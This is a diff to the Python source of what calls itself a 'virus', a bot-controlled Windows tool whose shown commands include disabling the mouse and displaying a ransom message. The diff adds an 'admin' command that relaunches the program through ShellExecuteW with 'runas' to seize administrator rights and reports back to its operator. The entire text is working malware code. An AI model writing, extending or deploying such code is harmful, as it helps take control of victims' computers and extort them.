@@ -1,4 +1,4 @@
-import ctypes,threading,os;import winreg as reg;import queue;import subprocess,webbrowser,asyncio,platform
+import ctypes,threading,os;import winreg as reg;import queue;import subprocess,webbrowser,asyncio,platform,sys
 async def nomouse(ctx, action):
  try:
   if action == "start":
@@ -94,3 +94,18 @@ async def paynow(ctx):
         await ctx.send("Ransom message showed")
     except Exception as e:
         return
+async def admin(ctx):
+    try:
+        if ctypes.windll.shell32.IsUserAnAdmin():
+            await ctx.send("virus already has admin perms")
+            return
+
+        script = sys.argv[0]
+        params = " ".join(sys.argv[1:])
+        command = f"python {script} {params}"
+
+        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, command, None, 1)
+        sys.exit()
+
+    except Exception as e:
+        await ctx.send(f"Error: {e}")
